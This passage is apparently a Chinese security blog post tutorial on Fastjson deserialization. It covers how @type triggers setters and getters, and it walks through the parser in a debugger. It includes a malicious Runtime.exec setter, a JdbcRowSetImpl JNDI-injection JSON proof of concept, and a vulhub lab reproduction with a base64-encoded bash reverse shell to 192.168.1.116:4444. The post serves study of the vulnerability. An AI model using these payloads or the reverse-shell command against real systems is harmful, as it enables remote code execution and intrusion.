+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Fastjsontest</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) {
+</span></span><span style="display:flex;"><span>        User user1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> User();
+</span></span><span style="display:flex;"><span>        user1.<span style="color:#a6e22e">setName</span>(<span style="color:#e6db74">&#34;ThnPkm&#34;</span>);
+</span></span><span style="display:flex;"><span>        user1.<span style="color:#a6e22e">setAge</span>(18);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//序列化</span>
+</span></span><span style="display:flex;"><span>        String serializedStr <span style="color:#f92672">=</span> JSON.<span style="color:#a6e22e">toJSONString</span>(user1, SerializerFeature.<span style="color:#a6e22e">WriteClassName</span>);
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;serializedStr= &#34;</span><span style="color:#f92672">+</span>serializedStr);
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//反序列化</span>
+</span></span><span style="display:flex;"><span>        Object obj3 <span style="color:#f92672">=</span> JSON.<span style="color:#a6e22e">parseObject</span>(serializedStr,User.<span style="color:#a6e22e">class</span>);
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;parseObject反序列化对象名称:&#34;</span><span style="color:#f92672">+</span>obj3.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getName</span>());
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;parseObject反序列化:&#34;</span><span style="color:#f92672">+</span>obj3);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><pre tabindex="0"><code>serializedStr= {&#34;@type&#34;:&#34;demo.User&#34;,&#34;age&#34;:18,&#34;name&#34;:&#34;ThnPkm&#34;}
+调用constructor
+调用setAge
+调用setName
+parseObject反序列化对象名称:demo.User
+parseObject反序列化:demo.User@46ee7fe8
+</code></pre><p>看到序列化的json多了个<code>@type</code>指定了序列化的类，那么反序列化时候，我们是也是通过<code>@type</code>来指定类 去完成反序列化</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> demo;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.alibaba.fastjson.JSON;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Unserialized</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) {
+</span></span><span style="display:flex;"><span>        String serializedStr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;{\&#34;@type\&#34;:\&#34;demo.User\&#34;,\&#34;age\&#34;:18,\&#34;name\&#34;:\&#34;ThnPkm\&#34;}&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;1.parse方法进行反序列化:&#34;</span>);
+</span></span><span style="display:flex;"><span>        Object obj1 <span style="color:#f92672">=</span> JSON.<span style="color:#a6e22e">parse</span>(serializedStr);
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;parse反序列化对象名称:&#34;</span><span style="color:#f92672">+</span>obj1.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getName</span>());
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;parse反序列化：&#34;</span><span style="color:#f92672">+</span>obj1);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;2.parseObj方法进行反序列化:&#34;</span>);
+</span></span><span style="display:flex;"><span>        Object obj2 <span style="color:#f92672">=</span> JSON.<span style="color:#a6e22e">parseObject</span>(serializedStr);
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;parseObject反序列化对象名称:&#34;</span><span style="color:#f92672">+</span>obj2.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getName</span>());
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;parseObject反序列化:&#34;</span><span style="color:#f92672">+</span>obj2);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><pre tabindex="0"><code>1.parse方法进行反序列化:
+调用constructor
+调用setAge
+调用setName
+parse反序列化对象名称:demo.User
+parse反序列化：demo.User@45283ce2
+2.parseObj方法进行反序列化:
+调用constructor
+调用setAge
+调用setName
+调用getAge
+调用getName
+parseObject反序列化对象名称:demo.User
+parseObject反序列化:demo.User@2077d4de
+</code></pre><p>通过<code>@type</code>来指定类 去完成反序列化，可以看到主要也是调用了setter / getter方法 ,parse触发了set方法，parseObject同时触发了set和get方法</p>
+<p>那么如果<code>@type</code>指定的是恶意类，我们也可以通过他的set方法或get方法去进行一些恶意的操作了，这就是fastjson反序列化的诱因。</p>
+<h2 id="反序列化漏洞">反序列化漏洞</h2>
+<p>通过上面重点的举例 大概也清楚了漏洞形成原因是咋回事了</p>
+<ul>
+<li>构造一个恶意类，然后通过这一特性实现命令执行</li>
+<li>@type 指定恶意类 去进行反序列化</li>
+<li>使用<code>JSON.parse</code>方法或<code>JSON.parseObj</code>反序列化会调用此类的set方法或get方法</li>
+</ul>
+<p>如果<code>@type</code>标识的类中的setter或getter方法存在恶意代码，那么就有可能存在fastjson反序列化漏洞</p>
+<p>我就在上面的User类里写个恶意的setter如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setCmd</span>(String cmd) <span style="color:#66d9ef">throws</span> IOException {
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;setCmd&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">cmd</span> <span style="color:#f92672">=</span> cmd;
+</span></span><span style="display:flex;"><span>        Runtime.<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(cmd);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>现在这个User类就是恶意类了，@type指定即可，反序列化过程执行了命令</p>
+<!-- raw HTML omitted -->
+<h3 id="调用流程">调用流程</h3>
+<p>调试跟着走一遍fastjson反序列化的流程，断点下在<code>JSON.parseObject(serializedStr);</code></p>
+<!-- raw HTML omitted -->
+<p>最后返回的是一个<code>JSONObject</code> 进去看就是Map键值对，我们跟进这个parse方法</p>
+<!-- raw HTML omitted -->
+<p>这个<code>DefaultJSONParser</code>相当于一个json 的解释器，对传入的json进行操作，features是对传入json一些条件限制</p>
+<p>继续跟进里面的<code>parse()</code></p>
+<p>是一个switch处理不同的json，对应的case去处理</p>
+<!-- raw HTML omitted -->
+<p>我们传入的json对象，<code>{</code>开头的 这里触发了case12</p>
+<!-- raw HTML omitted -->
+<p>去创建了一个新的<code>JSONObject</code> 并且调用了一个接收Map的<code>parseObject</code> ,跟进</p>
+<!-- raw HTML omitted -->
+<p>前面都是些判断不重要，后面走下去有个try-catch，里面也循环判断单引号双引号左括号啥的</p>
+<!-- raw HTML omitted -->
+<p>这里定义了一个key，我们的json都是双引号，所以进去这个if分支，key现在就是<code>@type</code> ，key值的不同做的工作也不同，继续看</p>
+<p>在定义 value 之前，都是对key的判断</p>
+<!-- raw HTML omitted -->
+<p>这里的<code>JSON.DEFAULT_TYPE_KEY</code> 也看到了就是<code>@type</code>, 那么进去看key如果是<code>@type</code>会怎么样</p>
+<p>看文章解释到：这里的key表示应该做java反序列化还是单纯的json反序列化，这里匹配到@type，所以后续要Java反序列化，或者说解析java对象</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p>可以看到对类进行了loadClass加载，然后后面我们就要按照Java的逻辑来进行反序列化操作</p>
+<p>这里第一步就是获取了反序列化器<code>deserializer</code>，然后用反序列化器进行反序列化操作，这一步做完返回的就是我们的obj2了</p>
+<p>然后我们就来跟进一下<code>getDeserializer</code>是如何进行反序列化的</p>
+<!-- raw HTML omitted -->
+<p>进去后也是一堆判断，判断都不是后 ，最后的else里面给了一个创建javabean反序列化器的方法</p>
+<p>跟进<code>createJavaBeanDeserializer</code></p>
+<!-- raw HTML omitted -->
+<p>前面也是一堆判断，直接看到关键的<code>JavaBeanInfo.build</code>，创建对应类的反序列化器的时候，需要了解这个类的东西，就是这里的build来组成JavaBeanInfo</p>
+<!-- raw HTML omitted -->
+<p>在build整体逻辑中，先循环遍历了一遍method（set），然后遍历了一遍public fields，然后又遍历了一遍method（get）</p>
+<p>打开这个循环看</p>
+<!-- raw HTML omitted -->
+<p>如上图。总结set方法自动调用的条件为：</p>
+<ol>
+<li>方法名长度大于4</li>
+<li>非静态方法</li>
+<li>返回值为void或当前类</li>
+<li>方法名以set开头</li>
+<li>参数个数为1</li>
+</ol>
+<!-- raw HTML omitted -->
+<p>set的整个判断就是：如果有setCmd()会绑定cmd属性，如果该类没有cmd属性会绑定isCmd属性。</p>
+<p>get的判断：</p>
+<!-- raw HTML omitted -->
+<p>总结下就是：</p>
+<ol>
+<li>方法名长度大于等于4</li>
+<li>非静态方法</li>
+<li>以get开头且第4个字母为大写</li>
+<li>无传入参数</li>
+<li>返回值类型继承自Collection、 Map 、AtomicBoolean 、AtomicInteger 、AtomicLong</li>
+</ol>
+<p>当程序绑定了对应的字段之后，如果传入json字符串的键值中存在这个值，就会去调用执行对应的setter、构造方法。</p>
+<p>后面跟着很乱，就先跟到这里了。大致就是遍历methods进而获取get、set方法。引用的大佬们的总结</p>
+<blockquote>
+<p>小结：</p>
+<ol>
+<li>parse(jsonStr) 构造方法+Json字符串指定属性的setter()+特殊的getter()</li>
+<li>parseObject(jsonStr) 构造方法+Json字符串指定属性的setter()+所有getter() 包括不存在属性和私有属性的getter()</li>
+<li>parseObject(jsonStr,Object.class) 构造方法+Json字符串指定属性的setter()+特殊的getter()</li>
+</ol>
+</blockquote>
+<blockquote>
+<p>FastJson反序列化和原生反序列化利用不同的点：</p>
+<ul>
+<li>FastJson不需要实现Serializable</li>
+<li>不需要变量不是transient/可控变量，变量需要有setter或是public或是满足条件的getter</li>
+<li>反序列化入口点不是readObject，而是setter或者是getter</li>
+<li>执行点是相同的：反射或者类加载</li>
+</ul>
+</blockquote>
+<h3 id="jndi注入">JNDI注入</h3>
+<p>jdk1.8.0_161 &lt; 1.8u191</p>
+<p>JNDI传输过程中使用的就是序列化和反序列化，所以通杀三种解析方式</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>JSON.<span style="color:#a6e22e">parse</span>(evil);
+</span></span><span style="display:flex;"><span>JSON.<span style="color:#a6e22e">parseObject</span>(evil);
+</span></span><span style="display:flex;"><span>JSON.<span style="color:#a6e22e">parseObject</span>(evil, Object.<span style="color:#a6e22e">class</span>);
+</span></span></code></pre></div><p>原理就是setter的自动调用</p>
+<p>这里JNDI注入利用到的是<code>com.sun.rowset.JdbcRowSetImpl</code></p>
+<p>跟进去搜<code>lookup</code> , 在<code>connet</code>方法中进行了调用</p>
+<!-- raw HTML omitted -->
+<p>看看哪里调用了connet()</p>
+<!-- raw HTML omitted -->
+<p>可以看到 这里有getter方法 也有 setter方法，都调用了connect。</p>
+<p>但是我们选择这里的setter方法<code>setAutoCommit</code>，不选getter方法的原因是我们上面分析过getter方法顺利执行的要求有些严格，返回值类型继承自Collection、 Map 、AtomicBoolean 、AtomicInteger 、AtomicLong。这里并不满足。</p>
+<!-- raw HTML omitted -->
+<p>所以我们就用<code>setAutoCommit</code>，这里的JNDI注入链子差不多就是这样了</p>
+<p>可以很简单的构造一个JSON序列化数据了， 下面就是json反序列化最简单的poc了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;@type&#34;</span>:<span style="color:#e6db74">&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span>, <span style="color:#75715e">//调用com.sun.rowset.JdbcRowSetImpl函数中的
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">&#34;dataSourceName&#34;</span>:<span style="color:#e6db74">&#34;ldap://127.0.0.1:1389/Exploit&#34;</span>, <span style="color:#75715e">// setdataSourceName函数 传入参数&#34;ldap://127.0.0.1:1389/Exploit&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">&#34;autoCommit&#34;</span>:<span style="color:#66d9ef">true</span> <span style="color:#75715e">// 再调用setAutoCommit函数，传入true
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span></code></pre></div><h4 id="vulhub复现-反弹shell">vulhub复现 反弹shell</h4>
+<p>通过<strong>vulhub</strong>搭建一下1.2.24的漏洞环境进行利用复现</p>
+<p><a href="https://github.com/vulhub/vulhub/blob/master/fastjson/1.2.24-rce/README.md" target="_blank" rel="noopener noreffer">https://github.com/vulhub/vulhub/blob/master/fastjson/1.2.24-rce/README.md</a>
+</p>
+<p>通过jndi测试工具 JNDI-Injection-Exploit 来启动rmi或ldap服务</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span style="color:#e6db74">&#34;bash -c {echo,YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjExNi80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}&#34;</span> -A <span style="color:#e6db74">&#34;192.168.1.116&#34;</span>
+</span></span></code></pre></div><p>这里的命令是反弹shell<code>bash -i  &gt;&amp; /dev/tcp/192.168.1.116/4444 0&gt;&amp;1</code>  ，我选择jndi的服务和nc连接的服务都开在了kali上了也就是<code>192.168.1.116</code></p>
+<p>生成相关命令的jndi服务</p>
+<!-- raw HTML omitted -->
+<p>选择ldap服务 放入poc来执行，成功反弹shell</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202309011956095.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202309011956095.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202309011956095.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202309011956095.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202309011956095.png"
+        title="image-20230901195638033" /></p>
+<p>（这里出现了玄学，总是不成功甚至没触发到开启的jndi服务，一直排查试错搞了一下午，后来放弃JNDI-Injection-Exploit准备用marshalsec试试，刚安装好marshalsec结果这边JNDI-Injection-Exploit通了）</p>
+<h3 id="templatesimpl-链子">TemplatesImpl 链子</h3>
+<p>除了JNDI的注入，还可以使用TemplateImpl进行字节码的加载，但是条件比较苛刻</p>
+<ol>
+<li>服务端使用parseObject()时，必须使用如下格式才能触发漏洞： <code>JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);</code></li>
+<li>服务端使用parse()时，需要<code>JSON.parse(text1,Feature.SupportNonPublicField);</code></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"></code></pre></div><p>参考：</p>
+<p><a href="https://xz.aliyun.com/t/12096" target="_blank" rel="noopener noreffer">https://xz.aliyun.com/t/12096</a>
+</p>
+<p><a href="https://xz.aliyun.com/t/12728" target="_blank" rel="noopener noreffer">https://xz.aliyun.com/t/12728</a>
+</p>
+<p><a href="https://blog.huamang.xyz/post/fastjson/" target="_blank" rel="noopener noreffer">https://blog.huamang.xyz/post/fastjson/</a>
+</p>
+<p><a href="https://xz.aliyun.com/t/11967" target="_blank" rel="noopener noreffer">https://xz.aliyun.com/t/11967</a>
+</p>
+<p><a href="https://y4er.com/posts/fastjson-learn/" target="_blank" rel="noopener noreffer">https://y4er.com/posts/fastjson-learn/</a>
+</p>
+<p><a href="https://blog.csdn.net/Bossfrank/article/details/130100893" target="_blank" rel="noopener noreffer">https://blog.csdn.net/Bossfrank/article/details/130100893</a>
+</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-08-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-fastjson/" data-title="java安全 Fastjson" data-hashtags="java"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-fastjson/" data-hashtag="java"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-fastjson/" data-title="java安全 Fastjson"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-fastjson/" data-title="java安全 Fastjson"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@6.20.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-fastjson/" data-title="java安全 Fastjson"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/java/">Java</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-jndi%E6%B3%A8%E5%85%A5/" class="prev" rel="prev" title="java安全 JNDI注入"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>java安全 JNDI注入</a>
+            <a href="/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-log4j/" class="next" rel="next" title="java安全 Log4j">java安全 Log4j<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.133.0">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
